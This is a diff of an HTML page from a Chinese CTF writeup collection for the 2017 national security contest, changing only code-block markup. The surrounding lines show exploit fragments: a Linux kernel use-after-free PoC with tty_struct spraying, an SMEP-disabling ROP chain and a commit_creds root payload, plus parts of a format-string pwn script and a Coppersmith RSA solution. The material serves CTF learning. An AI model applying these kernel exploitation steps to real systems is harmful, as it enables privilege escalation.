 <p>&#x6211;&#x4EEC;&#x5C31;&#x80FD;&#x6784;&#x9020;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;poc&#xFF0C;&#x901A;&#x8FC7;open&#x7533;&#x8BF7;&#x8BBE;&#x5907;&#x5BF9;&#x8C61;A&#x548C;B&#xFF0C;ioctl&#x5BF9;A&#x548C;B&#x521D;&#x59CB;&#x5316;&#x4E00;&#x6837;&#x5927;&#x5C0F;&#x7684;&#x7A7A;&#x95F4;&#xFF0C;&#x901A;&#x8FC7;kmalloc&#x7533;&#x8BF7;&#x7684;&#x7A7A;&#x95F4;&#x521D;&#x59CB;&#x5316;&#x540E;&#x90FD;&#x4E3A;0&#xFF0C;&#x968F;&#x540E;&#x6211;&#x4EEC;&#x901A;&#x8FC7;close&#x7684;&#x65B9;&#x6CD5;&#x5173;&#x95ED;&#x8BBE;&#x5907;&#x5BF9;&#x8C61;A&#xFF0C;&#x8FD9;&#x65F6;&#x5019;&#x518D;&#x901A;&#x8FC7;write&#xFF0C;&#x5411;&#x8BBE;&#x5907;&#x5BF9;&#x8C61;B&#x7684;buffer&#x5199;&#x5165;&#x3002;</p>
 <p>&#x9996;&#x5148;&#x4F1A;&#x5C06;buffer&#x7684;&#x503C;&#x4EA4;&#x7ED9;rdi&#xFF0C;&#x5E76;&#x4E14;&#x505A;&#x4E00;&#x6B21;&#x68C0;&#x67E5;&#x3002;</p>
-<pre class="language-"><code>.text:00000000000000F5 ; 7:   if ( babydev_struct.device_buf )
+<pre><code>.text:00000000000000F5 ; 7:   if ( babydev_struct.device_buf )
 .text:00000000000000F5                 mov     filp, cs:babydev_struct.device_buf
 .text:00000000000000FC                 test    rdi, rdi
 .text:00000000000000FF                 jz      short loc_125
@@ -953,7 +966,7 @@ Continue
 <p>&#x65E2;&#x7136;&#x8FD9;&#x7247;&#x7A7A;&#x95F4;&#x662F;&#x91CA;&#x653E;&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x5728;&#x8FD9;&#x4E2A;&#x7A7A;&#x95F4;&#x8986;&#x76D6;&#x5BF9;&#x8C61;&#xFF0C;&#x540C;&#x65F6;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5BF9;&#x8BBE;&#x5907;B&#x7684;write/read&#x64CD;&#x4F5C;&#xFF0C;&#x8FBE;&#x5230;&#x5BF9;&#x8FD9;&#x4E2A;&#x5185;&#x6838;&#x5BF9;&#x8C61;&#x7684;&#x8BFB;&#x5199;&#x80FD;&#x529B;&#xFF0C;ling&#x63D0;&#x5230;&#x4E86;tty_struct&#x7ED3;&#x6784;&#x4F53;&#xFF0C;&#x8FD9;&#x662F;Linux&#x9A71;&#x52A8;&#x901A;&#x4FE1;&#x4E00;&#x4E2A;&#x975E;&#x5E38;&#x91CD;&#x8981;&#x7684;&#x6570;&#x636E;&#x7ED3;&#x6784;&#xFF0C;&#x5173;&#x4E8E;tty_struct&#x7ED3;&#x6784;&#x4F53;&#x7684;&#x5185;&#x5BB9;&#x53EF;&#x4EE5;&#x53BB;&#x7F51;&#x4E0A;&#x641C;&#x5230;&#x3002;</p>
 <p>&#x4E8E;&#x662F;&#x6574;&#x4E2A;&#x95EE;&#x9898;&#x5C31;&#x6BD4;&#x8F83;&#x660E;&#x6717;&#x4E86;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#x6765;&#x5236;&#x9020;&#x4E00;&#x4E2A;hole&#xFF0C;&#x8FD9;&#x4E2A;hole&#x7684;&#x5927;&#x5C0F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;ioctl&#x63A7;&#x5236;&#xFF0C;&#x6211;&#x4EEC;&#x5C06;&#x5176;&#x63A7;&#x5236;&#x6210;tty_struct&#x7ED3;&#x6784;&#x4F53;&#x7684;&#x5927;&#x5C0F;0x2e0&#xFF0C;&#x968F;&#x540E;close&#x5173;&#x95ED;&#x8BBE;&#x5907;A&#xFF0C;&#x901A;&#x8FC7;open(/dev/ptmx)&#x7684;&#x65B9;&#x6CD5;&#x7533;&#x8BF7;&#x5927;&#x91CF;&#x7684;tty_struct&#x7ED3;&#x6784;&#x4F53;&#xFF0C;&#x786E;&#x4FDD;&#x8FD9;&#x4E2A;&#x7ED3;&#x6784;&#x4F53;&#x80FD;&#x591F;&#x5360;&#x7528;&#x5230;&#x8FD9;&#x4E2A;hole&#xFF0C;&#x4E4B;&#x540E;&#x901A;&#x8FC7;&#x5BF9;&#x8BBE;&#x5907;B&#x8C03;&#x7528;write/read&#x51FD;&#x6570;&#x5B8C;&#x6210;&#x5BF9;tty_struct&#x7ED3;&#x6784;&#x4F53;&#x7684;&#x63A7;&#x5236;&#x3002;</p>
 <p>&#x9996;&#x5148;&#x6211;&#x4EEC;&#x6309;&#x7167;&#x4E0A;&#x9762;&#x601D;&#x8DEF;&#xFF0C;&#x7F16;&#x5199;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;poc&#x3002;</p>
-<pre class="language-"><code>    fd = open(&quot;/dev/babydev&quot;,O_RDWR);
+<pre><code>    fd = open(&quot;/dev/babydev&quot;,O_RDWR);
     fd1 = open(&quot;/dev/babydev&quot;,O_RDWR);
     //init babydev_struct
     printf(&quot;Init buffer for tty_struct,%dn&quot;,sizeof(tty));
@@ -969,7 +982,7 @@ Continue
        <img src="http://p9.qhimg.com/t01f3029c17dba24655.png" alt="">
      </a></p>
 <p>&#x5F53;&#x7136;&#xFF0C;&#x901A;&#x8FC7;&#x542F;&#x52A8;&#x547D;&#x4EE4;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x7CFB;&#x7EDF;&#x5F00;&#x542F;&#x4E86;smep&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x6784;&#x9020;&#x4E00;&#x4E2A;rop chain&#x6765;&#x5B8C;&#x6210;&#x5BF9;cr4&#x5BC4;&#x5B58;&#x5668;&#x7684;&#x4FEE;&#x6539;&#xFF0C;&#x5C06;cr4&#x4E2D;smep&#x7684;&#x6BD4;&#x7279;&#x4F4D;&#x7F6E;0&#xFF0C;&#x6765;&#x5173;&#x95ED;smep&#x3002;</p>
-<pre class="language-"><code>    unsigned long rop_chain[] = {
+<pre><code>    unsigned long rop_chain[] = {
         poprdiret,
         0x6f0, // cr4 with smep disabled
         native_write_cr4,
@@ -986,7 +999,7 @@ Continue
      </a></p>
 <p>&#x6211;&#x4EEC;&#x901A;&#x8FC7;&#x8986;&#x76D6;tty_struct&#x4E2D;&#x7684;tty_operations&#xFF0C;&#x6765;&#x5C06;fake tty_operations&#x7684;ioctl&#x51FD;&#x6570;&#x66FF;&#x6362;&#x6389;&#xFF0C;&#x6539;&#x6210;stack pivot&#xFF0C;&#x4E4B;&#x540E;&#x6211;&#x4EEC;&#x8C03;&#x7528;ioctl&#x51FD;&#x6570;&#x7684;&#x65F6;&#x5019;&#x76F8;&#x5F53;&#x4E8E;&#x53BB;&#x6267;&#x884C;stack pivot&#xFF0C;&#x4ECE;&#x800C;&#x63A7;&#x5236;rip&#x3002;</p>
 <p>&#x5F53;&#x7136;&#xFF0C;&#x8FD9;&#x4E2A;ioctl&#x7684;&#x8BBE;&#x5907;&#x5BF9;&#x8C61;&#x4E0D;&#x80FD;&#x662F;&#x8BBE;&#x5907;B&#xFF0C;&#x800C;&#x662F;&#x9700;&#x8981;tty_struct&#x55B7;&#x5C04;&#x65F6;&#x6240;&#x4F7F;&#x7528;&#x7684;&#x7684;&#x8BBE;&#x5907;&#x5BF9;&#x8C61;&#xFF0C;tty_struct&#x7684;&#x55B7;&#x5C04;&#x4F7F;&#x7528;open&#x65B9;&#x6CD5;&#x5B8C;&#x6210;&#x3002;</p>
-<pre class="language-"><code>for(i=0;i&lt;ALLOC_NUM;i++)
+<pre><code>for(i=0;i&lt;ALLOC_NUM;i++)
     {
     m_fd[i] = open(&quot;/dev/ptmx&quot;,O_RDWR|O_NOCTTY);
     if(m_fd[i] == -1)
@@ -996,7 +1009,7 @@ Continue
     }
 </code></pre><p>&#x7531;&#x4E8E;tty_operations-&gt;ioctl&#x88AB;&#x4FEE;&#x6539;&#xFF0C;&#x8F6C;&#x800C;&#x53BB;&#x6267;&#x884C;stack pivot&#xFF0C;&#x4ECE;&#x800C;&#x83B7;&#x5F97;&#x63A7;&#x5236;rip&#x7684;&#x80FD;&#x529B;&#xFF0C;&#x8FD9;&#x6837;&#x901A;&#x8FC7;stack pivot&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x8FDB;&#x5165;&#x6211;&#x4EEC;rop chain&#x4E86;&#x3002;</p>
 <p>&#x4E4B;&#x540E;&#x6211;&#x4EEC;&#x901A;&#x8FC7;get root payload&#x6765;&#x5B8C;&#x6210;&#x63D0;&#x6743;&#x3002;</p>
-<pre class="language-"><code>root_payload(void)
+<pre><code>root_payload(void)
 {
     commit_creds(prepare_kernel_cred(0));
 }
@@ -1011,7 +1024,7 @@ Continue
 <h3 id="18notformat"><a name="18notformat" class="anchor-navigation-ex-anchor" href="#18notformat"><i class="fa fa-link" aria-hidden="true"></i></a>5.3.3. 18.NotFormat</h3>
 <p>&#x7C7B;&#x578B;&#xFF1A;PWN   &#x5206;&#x503C;&#xFF1A;250&#x5206;</p>
 <p>&#x660E;&#x663E;&#x7684;&#x683C;&#x5F0F;&#x5316;&#xFF0C;&#x5728;print&#x4E4B;&#x540E;&#x76F4;&#x63A5;&#x8C03;&#x7528;exit&#x9000;&#x51FA;&#x4E86;&#x3002;&#x548C;0ctf&#x7684;easyprintf&#x6709;&#x70B9;&#x7C7B;&#x4F3C;&#xFF0C;&#x53C2;&#x8003;<a href="http://blog.dragonsector.pl/2017/03/0ctf-2017-easiestprintf-pwn-150.html&#x3002;&#x4E0E;easyprintf&#x4E0D;&#x540C;&#x7684;&#x662F;&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x662F;&#x9759;&#x6001;&#x7F16;&#x8BD1;&#x7684;&#xFF0C;&#x7A0B;&#x5E8F;&#x4E2D;&#x6CA1;&#x6709;system&#x51FD;&#x6570;&#xFF0C;&#x56E0;&#x6B64;&#x6784;&#x9020;&#x4E86;&#x4E00;&#x4E2A;&#x88F8;&#x7684;rop&#x53BB;&#x83B7;&#x53D6;shell&#x3002;" target="_blank">http://blog.dragonsector.pl/2017/03/0ctf-2017-easiestprintf-pwn-150.html&#x3002;&#x4E0E;easyprintf&#x4E0D;&#x540C;&#x7684;&#x662F;&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x662F;&#x9759;&#x6001;&#x7F16;&#x8BD1;&#x7684;&#xFF0C;&#x7A0B;&#x5E8F;&#x4E2D;&#x6CA1;&#x6709;system&#x51FD;&#x6570;&#xFF0C;&#x56E0;&#x6B64;&#x6784;&#x9020;&#x4E86;&#x4E00;&#x4E2A;&#x88F8;&#x7684;rop&#x53BB;&#x83B7;&#x53D6;shell&#x3002;</a></p>
-<pre class="language-"><code>from threading import Thread
+<pre><code>from threading import Thread
 import operator
 from zio import *
 target = &apos;./NotFormat&apos;
@@ -1093,7 +1106,7 @@ exp(target)
 <h3 id="4&#x4F20;&#x611F;&#x5668;1"><a name="4&#x4F20;&#x611F;&#x5668;1" class="anchor-navigation-ex-anchor" href="#4&#x4F20;&#x611F;&#x5668;1"><i class="fa fa-link" aria-hidden="true"></i></a>5.4.1. 4.&#x4F20;&#x611F;&#x5668;1</h3>
 <p>&#x7C7B;&#x578B;&#xFF1A;MISC    &#x5206;&#x503C;&#xFF1A;100&#x5206;</p>
 <p>&#x5DEE;&#x5206;&#x66FC;&#x5F7B;&#x65AF;&#x7279;</p>
-<pre class="language-"><code>from Crypto.Util.number import *
+<pre><code>from Crypto.Util.number import *
 id1 = 0x8893CA58
 msg1 = 0x3EAAAAA56A69AA55A95995A569AA95565556
 msg2 = 0x3EAAAAA56A69AA556A965A5999596AA95656
@@ -1182,14 +1195,14 @@ print hex(int(r,2)).upper()
 <h3 id="11partial"><a name="11partial" class="anchor-navigation-ex-anchor" href="#11partial"><i class="fa fa-link" aria-hidden="true"></i></a>5.5.1. 11.partial</h3>
 <p>&#x7C7B;&#x578B;&#xFF1A;Crypto    &#x5206;&#x503C;&#xFF1A;300&#x5206;</p>
 <p>Coppersmith Attack &#x5DF2;&#x77E5;&#x90E8;&#x5206;p&#xFF0C;&#x5176;&#x5B9E;&#x7ED9;&#x7684;&#x6709;&#x70B9;&#x591A;&#xFF0C;&#x7ED9;576bit&#x7684;&#x5C31;&#x8DB3;&#x591F;&#x4E86;</p>
-<pre class="language-"><code>n=0x985CBA74B3AFCF36F82079DE644DE85DD6658A2D3FB2D5C239F2657F921756459E84EE0BBC56943DE04F2A04AACE311574BE1E9391AC5B0F8DBB999524AF8DF2451A84916F6699E54AE0290014AFBF561B0E502CA094ADC3D9582EA22F857529D3DA79737F663A95767FDD87A9C19D8104A736ACBE5F4A25B2A25B4DF981F44DB2EB7F3028B1D1363C3A36F0C1B9921C7C06848984DFE853597C3410FCBF9A1B49C0F5CB0EEDDC06D722A0A7488F893D37996F9A92CD3422465F49F3035FEA6912589EFCFB5A4CF9B69C81B9FCC732D6E6A1FFCE9690F34939B27113527ABB00878806B229EC6570815C32BC2C134B0F56C21A63CA535AB467593246508CA9F9
+<pre><code>n=0x985CBA74B3AFCF36F82079DE644DE85DD6658A2D3FB2D5C239F2657F921756459E84EE0BBC56943DE04F2A04AACE311574BE1E9391AC5B0F8DBB999524AF8DF2451A84916F6699E54AE0290014AFBF561B0E502CA094ADC3D9582EA22F857529D3DA79737F663A95767FDD87A9C19D8104A736ACBE5F4A25B2A25B4DF981F44DB2EB7F3028B1D1363C3A36F0C1B9921C7C06848984DFE853597C3410FCBF9A1B49C0F5CB0EEDDC06D722A0A7488F893D37996F9A92CD3422465F49F3035FEA6912589EFCFB5A4CF9B69C81B9FCC732D6E6A1FFCE9690F34939B27113527ABB00878806B229EC6570815C32BC2C134B0F56C21A63CA535AB467593246508CA9F9
 p=0xBCF6D95C9FFCA2B17FD930C743BCEA314A5F24AE06C12CE62CDB6E8306A545DE468F1A23136321EB82B4B8695ECE58B763ECF8243CBBFADE0603922C130ED143D4D3E88E483529C820F7B53E4346511EB14D4D56CB2B714D3BDC9A2F2AB655993A31E0EB196E8F63028F9B29521E9B3609218BA0000000000000000000000000
 p_fake = p+0x10000000000000000000000000
 pbits = 1024
 kbits = pbits-576
 pbar = p_fake &amp; (2^pbits-2^kbits)
 print &quot;upper %d bits (of %d bits) is given&quot; % (pbits-kbits, pbits)
-PR.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">&gt;</span></span> = PolynomialRing(Zmod(n))
+PR.&lt;x&gt; = PolynomialRing(Zmod(n))
 f = x + pbar
 x0 = f.small_roots(X=2^kbits, beta=0.4)[0]  # find root &lt; 2^kbits with factor &gt;= n^0.4
 print x0 + pbar
@@ -1253,7 +1266,7 @@ flag{4_5ing1e_R00T_cAn_chang3_eVeryth1ng}
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"2017全国信安赛","level":"1.5.3","depth":2,"next":{"title":"2019西湖论剑预选赛","level":"1.5.4","depth":2,"path":"articals/xihulunjian2019.md","ref":"articals/xihulunjian2019.md","articles":[]},"previous":{"title":"2019DDCTF","level":"1.5.2","depth":2,"path":"articals/2019ddctf.md","ref":"articals/2019ddctf.md","articles":[]},"dir":"ltr"},"config":{"plugins":["expandable-chapters","splitter","anchors","copy-code-button","github","-highlight","prism","sitemap","analytics","search-plus","anchor-navigation-ex","fancybox"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"prism":{"css":["prismjs/themes/prism.css"]},"fancybox":{"helpers":{"buttons":{}}},"github":{"url":"https://github.com/HackerYunen/CTFWP"},"analytics":{"baidu":"2b55d8e2dd73ae8a37978eec7e143a7c"},"splitter":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"fontsettings":{"theme":"white","family":"sans","size":2},"anchor-navigation-ex":{"associatedWithSummary":true,"float":{"floatIcon":"fa fa-navicon","level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showGoTop":true,"showLevel":true},"sitemap":{"hostname":"https://www.ctfwp.com/"},"copy-code-button":{},"sharing":{"facebook":false,"twitter":false,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":[]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"anchors":{},"expandable-chapters":{},"search-plus":{}},"theme":"default","author":"Yunen <yunen@cqu.edu.cn>","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"CTF Writeup","links":{"sharing":{"all":false,"facebook":false,"google":false,"twitter":false,"weibo":false},"sidebar":{"首页":"/"}},"gitbook":"*","description":"Collect writeups of CTF.","extension":null},"file":{"path":"articals/2017national.md","mtime":"2019-04-23T06:39:23.848Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-04-24T08:48:49.502Z"},"basePath":"..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"2017全国信安赛","level":"1.5.4","depth":2,"next":{"title":"2019西湖论剑预选赛","level":"1.5.5","depth":2,"path":"articals/xihulunjian2019.md","ref":"articals/xihulunjian2019.md","articles":[]},"previous":{"title":"2019DDCTF","level":"1.5.3","depth":2,"path":"articals/2019ddctf.md","ref":"articals/2019ddctf.md","articles":[]},"dir":"ltr"},"config":{"plugins":["expandable-chapters","splitter","anchors","copy-code-button","github","highlight","sitemap","analytics","search-plus","anchor-navigation-ex","fancybox"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"fancybox":{"helpers":{"buttons":{}}},"github":{"url":"https://github.com/HackerYunen/CTFWP"},"analytics":{"baidu":"2b55d8e2dd73ae8a37978eec7e143a7c"},"splitter":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"anchor-navigation-ex":{"associatedWithSummary":true,"float":{"floatIcon":"fa fa-navicon","level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showGoTop":true,"showLevel":true},"sitemap":{"hostname":"https://www.ctfwp.com/"},"copy-code-button":{},"sharing":{"facebook":false,"twitter":false,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":[]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"anchors":{},"expandable-chapters":{},"search-plus":{}},"theme":"default","author":"Yunen <yunen@cqu.edu.cn>","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"CTF Writeup","links":{"sharing":{"all":false,"facebook":false,"google":false,"twitter":false,"weibo":false},"sidebar":{"首页":"/"}},"gitbook":"*","description":"Collect writeups of CTF.","extension":null},"file":{"path":"articals/2017national.md","mtime":"2019-04-23T06:39:23.848Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-04-26T12:13:29.773Z"},"basePath":"..","book":{"language":""}});
         });
     </script>
 </div>
